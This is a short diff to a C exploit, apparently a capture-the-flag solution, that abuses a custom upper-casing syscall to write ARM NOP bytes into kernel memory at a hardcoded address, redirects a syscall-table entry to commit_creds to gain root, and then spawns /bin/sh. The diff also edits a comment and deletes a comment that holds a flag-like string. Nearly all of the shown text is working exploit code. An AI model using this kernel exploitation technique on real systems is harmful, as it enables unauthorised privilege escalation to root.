@@ -13,7 +13,7 @@ int main(){
   unsigned int** sct=(unsigned int**)SYS_CALL_TABLE;
    
 
-   // Replace commit_creds - 12 with some kind of NOP (mov r8,r8)
+   // Write in [commit_creds - 12] 12 bytes of some kind of NOP (mov r8,r8)
    syscall(SYS_UPPER,"\x08\x80\xa0\xe1\x08\x80\xa0\xe1\x08\x80\xa0\xe1",0x8003f560); 
 
    // Replace sys_stime with commit_creds -12
@@ -28,5 +28,4 @@ int main(){
    // Shell
    system("/bin/sh");
    return 0;
-   //Must_san1tize_Us3r_p0int3r
 }
